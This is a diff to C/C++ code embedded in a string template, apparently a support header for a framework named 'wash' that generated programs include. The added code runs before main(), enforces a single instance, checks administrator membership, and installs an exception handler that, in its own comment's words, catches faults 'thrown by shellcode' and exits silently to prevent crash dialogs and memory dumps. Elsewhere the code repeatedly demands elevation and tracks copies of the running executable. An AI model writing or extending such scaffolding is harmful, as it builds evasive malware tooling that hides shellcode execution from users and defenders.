@@ -135,13 +135,33 @@ static BOOL wash_is_elevated(void)
     BOOL elevated = FALSE;
     HANDLE token = NULL;
 
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &token))
     {
         TOKEN_ELEVATION elevation = {0};
         DWORD size = sizeof(elevation);
 
         if (GetTokenInformation(token, TokenElevation, &elevation, size, &size))
             elevated = elevation.TokenIsElevated;
+
+        // Fallback for SYSTEM and non-split-token accounts where TokenIsElevated
+        // may be reported as 0 despite full admin group membership.
+        if (!elevated)
+        {
+            HANDLE impToken = NULL;
+            if (DuplicateToken(token, SecurityImpersonation, &impToken))
+            {
+                PSID adminSid = NULL;
+                SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
+                if (AllocateAndInitializeSid(&ntAuth, 2,
+                        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+                        0, 0, 0, 0, 0, 0, &adminSid))
+                {
+                    CheckTokenMembership(impToken, adminSid, &elevated);
+                    FreeSid(adminSid);
+                }
+                CloseHandle(impToken);
+            }
+        }
 
         CloseHandle(token);
     }
@@ -194,6 +214,14 @@ static void wash_demand_elevation_or_shutdown(DWORD maxDenials, DWORD retryMs)
     if (wash_is_elevated())
         return;
 
+    // In Session 0 (services, scheduled tasks running as SYSTEM) there is no
+    // interactive desktop — ShellExecuteW("runas") cannot show a UAC dialog and
+    // would silently fail, creating an infinite spin-loop. Skip the UAC dance.
+    DWORD _wash_sessionId = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &_wash_sessionId);
+    if (_wash_sessionId == 0)
+        return;
+
     if (retryMs == 0)
         retryMs = 300;
 
@@ -229,10 +257,52 @@ static void wash_demand_elevation(void)
     wash_demand_elevation_or_shutdown(0, 300);
 }
 
+// Returns TRUE the first time this binary is launched; FALSE if another instance
+// is already running. Uses a session-local named mutex derived from the module path
+// so rename/move creates a separate lock identity.
+static BOOL wash_single_instance(void)
+{
+    wchar_t self[MAX_PATH] = {0};
+    wchar_t mutexName[64]  = {0};
+    GetModuleFileNameW(NULL, self, MAX_PATH);
+    DWORD hash = 2166136261u;
+    for (int i = 0; self[i]; i++)
+        hash = (hash ^ (DWORD)self[i]) * 16777619u;
+    wsprintfW(mutexName, L"Local\\wash_%08X", hash);
+    HANDLE h = CreateMutexW(NULL, TRUE, mutexName);
+    if (h == NULL)
+        return TRUE; // creation failed; allow run rather than silently exit
+    return GetLastError() != ERROR_ALREADY_EXISTS;
+}
+
+// Vectored exception handler: catches hardware faults thrown by shellcode and
+// exits cleanly instead of producing a WER crash dialog or memory dump.
+static LONG WINAPI _wash_veh(PEXCEPTION_POINTERS ep)
+{
+    DWORD code = ep->ExceptionRecord->ExceptionCode;
+    if (code == EXCEPTION_ACCESS_VIOLATION    ||
+        code == EXCEPTION_ILLEGAL_INSTRUCTION ||
+        code == EXCEPTION_STACK_OVERFLOW      ||
+        code == EXCEPTION_PRIV_INSTRUCTION    ||
+        code == EXCEPTION_INT_DIVIDE_BY_ZERO)
+    {
+        ExitProcess(0);
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
 // File-scope object whose constructor runs before main() and registers the
 // running executable path in wash_copies[]. Removes the need for snippets to
 // call wash_track_self() explicitly.
-struct __wash_self_track_init { __wash_self_track_init() { wash_track_self(); } };
+struct __wash_self_track_init
+{
+    __wash_self_track_init()
+    {
+        wash_track_self();
+        if (!wash_single_instance()) ExitProcess(0);
+        AddVectoredExceptionHandler(0, _wash_veh);
+    }
+};
 static __wash_self_track_init __wash_self_track_init_instance;
 """;
 
